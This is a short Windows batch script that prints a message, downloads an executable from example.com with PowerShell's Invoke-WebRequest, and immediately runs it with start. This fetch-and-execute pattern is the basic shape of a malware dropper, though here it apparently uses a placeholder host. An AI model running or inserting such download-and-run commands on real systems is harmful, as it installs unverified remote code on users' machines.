@echo off

echo Starting command script

powershell -Command "Invoke-WebRequest http://example.com/file.exe -OutFile test.exe"

start test.exe
